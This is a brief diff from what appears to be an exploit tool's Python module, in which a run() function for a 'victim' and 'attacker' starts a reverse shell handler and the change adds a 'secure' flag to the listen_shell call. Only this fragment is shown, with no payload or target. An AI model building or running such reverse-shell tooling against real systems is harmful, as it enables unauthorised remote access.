@@ -23,6 +23,6 @@ def run(victim_info, attacker_info, general_info, arguments):
 			sys.exit('Aborting exploit!')
 	
 		print('[*] Proceeding with the reverse shell handler')
-	listen_shell(victim_info, attacker_info, general_info)
+	listen_shell(victim_info, attacker_info, general_info, victim_info['secure'] == 'True')
 	
 	
